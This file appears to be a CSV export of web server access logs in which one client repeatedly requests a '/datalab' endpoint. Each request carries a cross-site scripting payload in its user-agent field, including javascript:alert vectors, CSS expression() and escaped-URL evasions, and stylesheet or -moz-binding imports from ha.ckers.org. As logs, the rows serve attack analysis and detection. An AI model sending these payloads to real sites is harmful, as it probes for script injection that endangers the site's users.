"","X1","X2","X3","X4","X5","X6","X7","X8","X9","X10"
"298","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:20:54 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <BR SIZE=""&{alert('XSS')}""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"299","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:21:19 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <LINK REL=""stylesheet","HREF=""javascript:alert('XSS');"">"
"300","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:21:19 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""javascript:alert('XSS');"">"
"301","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:21:19 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""javascript:alert('XSS');"">"
"302","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:23:19 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""javascript:alert('XSS');"">"
"303","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:25:19 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""javascript:alert('XSS');"">"
"304","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:25:44 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"305","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:25:44 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"306","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:25:44 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"307","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:25:45 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"308","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:25:45 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"309","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:25:45 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"310","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:26:02 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"311","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:26:02 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"312","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:26:02 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"313","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:28:02 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"314","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:30:02 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"315","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:40:08 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"316","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:40:08 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"317","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:40:08 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"318","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:40:09 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"319","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:40:09 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"320","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:40:09 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <LINK REL=""stylesheet","HREF=""http://ha.ckers.org/xss.css"">"
"321","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:40:24 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"322","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:40:24 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"323","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:40:24 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"324","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:42:24 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"325","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:44:25 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"326","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:44:41 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <META HTTP-EQUIV=""Link","Content=""<http://ha.ckers.org/xss.css>;"
"327","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:44:41 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""Link","Content=""<http://ha.ckers.org/xss.css>;"
"328","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:44:42 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""Link","Content=""<http://ha.ckers.org/xss.css>;"
"329","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:44:44 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""Link","Content=""<http://ha.ckers.org/xss.css>;"
"330","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:44:44 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""Link","Content=""<http://ha.ckers.org/xss.css>;"
"331","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:44:44 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""Link","Content=""<http://ha.ckers.org/xss.css>;"
"332","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:45:08 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"333","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:45:08 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"334","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:45:09 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"335","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:45:11 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","197"
"336","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:45:11 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"337","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:45:11 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"338","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:45:33 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"339","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:45:33 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"340","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:45:34 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"341","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:47:33 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"342","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:49:34 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"343","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:49:52 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","26"
"344","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:49:52 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","23"
"345","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:49:52 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","14"
"346","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:51:52 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"347","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:53:53 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"348","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:54:07 +0000","GET / HTTP/1.1",200,1040,NA,"datalab exp/*<A STYLE='no\xss:noxss(""*//*""); Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"349","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:54:07 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab exp/*<A STYLE='no\xss:noxss(""*//*""); Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"350","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:54:07 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab exp/*<A STYLE='no\xss:noxss(""*//*""); Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"351","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:56:07 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab exp/*<A STYLE='no\xss:noxss(""*//*""); Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"352","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:58:08 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab exp/*<A STYLE='no\xss:noxss(""*//*""); Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"353","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:58:32 +0000","GET / HTTP/1.1",200,1040,NA,"datalab xss:ex/*XSS*//*/*/pression(alert(""XSS""))'> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"354","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:58:32 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab xss:ex/*XSS*//*/*/pression(alert(""XSS""))'> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"355","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:58:33 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab xss:ex/*XSS*//*/*/pression(alert(""XSS""))'> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"356","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:00:33 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab xss:ex/*XSS*//*/*/pression(alert(""XSS""))'> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"357","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:02:33 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab xss:ex/*XSS*//*/*/pression(alert(""XSS""))'> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"358","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:02:54 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","55"
"359","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:02:54 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","272"
"360","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:02:54 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","50"
"361","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:04:54 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"362","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:06:55 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE TYPE=""text/javascript"">alert('XSS');</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"363","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:07:16 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","63"
"364","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:07:18 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","17"
"365","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:07:18 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"366","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:09:18 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"367","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:11:19 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"368","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:11:42 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","46"
"369","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:11:43 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","21"
"370","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:11:43 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"371","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:13:43 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"372","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:15:43 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"373","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:16:04 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <XSS STYLE=""xss:expression(alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","35"
"374","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:16:04 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <XSS STYLE=""xss:expression(alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","13"
"375","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:16:04 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <XSS STYLE=""xss:expression(alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"376","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:18:04 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <XSS STYLE=""xss:expression(alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"377","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:04 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <XSS STYLE=""xss:expression(alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
